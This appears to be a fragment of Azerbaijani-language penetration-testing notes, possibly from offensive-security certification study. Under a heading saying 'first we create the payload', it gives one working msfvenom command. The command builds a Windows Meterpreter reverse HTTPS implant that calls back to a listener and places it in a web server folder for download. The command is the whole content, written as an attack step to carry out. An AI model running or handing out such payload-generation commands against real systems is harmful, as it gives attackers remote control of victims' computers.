## İlk öncə payloadı yaradırıq

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.128.71 LPORT=4444 -f exe -o /var/www/html/osep.exe
```
